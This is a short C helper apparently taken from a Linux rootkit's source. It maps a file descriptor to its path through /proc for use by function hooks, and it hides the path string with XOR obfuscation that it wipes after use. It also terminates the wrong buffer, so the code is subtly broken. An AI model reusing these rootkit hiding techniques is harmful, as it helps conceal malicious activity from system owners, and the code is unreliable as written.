#include <string.h> 
#include <stdio.h> 
#include "../rkconst.h"

// Gets name from file description 
// Don't need one for fpointer because most of the hooks only take fdesc 
int name_from_fd(int fd, char *buf, size_t size)
{ 
	char name[256]; 
	char *proc_path = strdup(PROC_PATH); strxor(proc_path);	
	snprintf(name, sizeof(name), proc_path, fd);
	ssize_t ret = readlink(name, buf, size); 
	
	if (ret == -1) return 0; 
	
	name[ret] = 0; 
	
	memset(name, 0x0, sizeof(name)); 
	CLEAN(proc_path); 
	return 1; 
}

